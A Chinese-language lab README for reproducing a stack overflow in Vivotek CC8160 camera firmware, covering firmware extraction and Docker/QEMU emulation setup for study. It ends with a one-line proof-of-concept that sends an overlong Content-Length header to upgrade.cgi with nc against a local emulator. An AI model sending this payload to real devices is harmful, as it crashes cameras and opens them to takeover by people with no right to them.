# Vivotek CC8160 栈溢出漏洞


## 漏洞环境

使用 `firmianay/binwalk` 解压固件：

```sh
$ docker run --rm -v $PWD/firmware/:/root/firmware firmianay/binwalk -Mer "/root/firmware/CC8160-VVTK-0100d.flash.pkg"
```

### 用户级模拟 - 快速验证

手动构建：

```sh
# 构建漏洞环境
$ docker-compose -f docker-compose-user.yml build

# 后台启动环境
$ docker-compose -f docker-compose-user.yml up
```

直接拉取：

```sh
# 拉取漏洞环境并启动
$ docker pull firmianay/vivotek:remote_stack_overflow-user
$ docker run --rm --privileged -p 8888:80 -it vivotek:remote_stack_overflow-user
```

### 系统级模拟 - 动态调试

手动构建，解包过程同上。如果想要动态调试，还需要编译对应的 armel gdbserver 并复制到 system-emu/tools 目录。

```sh
# cp baseImage/gdbserver/7.11.1/armel-gdbserver-7.11.1 CVE-2020-3331/system-emu/tools/gdbserver

# 先构建漏洞环境 qemu-system:arm 环境
$ cd baseImage/qemu-system/armel
$ docker build -t qemu-system:armel .

# 再构建漏洞环境
$ docker-compose -f docker-compose-system.yml build

# 启动环境
$ docker-compose -f docker-compose-system.yml up
# 等待启动完成，重新开启一个窗口做后续操作
$ docker exec -it vivotek-system /bin/bash
$ ssh root@192.168.2.2
```

直接拉取：

```sh
$ docker pull firmianay/vivotek:remote_stack_overflow-system
$ docker run --rm --privileged -it vivotek:remote_stack_overflow-system
```

## 漏洞复现

```sh
echo -en "POST /cgi-bin/admin/upgrade.cgi\r\nHTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | nc -v 127.0.0.1 8888
```

![img](./crash.png)


## 参考链接

- https://www.exploit-db.com/exploits/44001
- https://xz.aliyun.com/t/5054
- https://www.anquanke.com/post/id/185336
- https://paper.seebug.org/480/
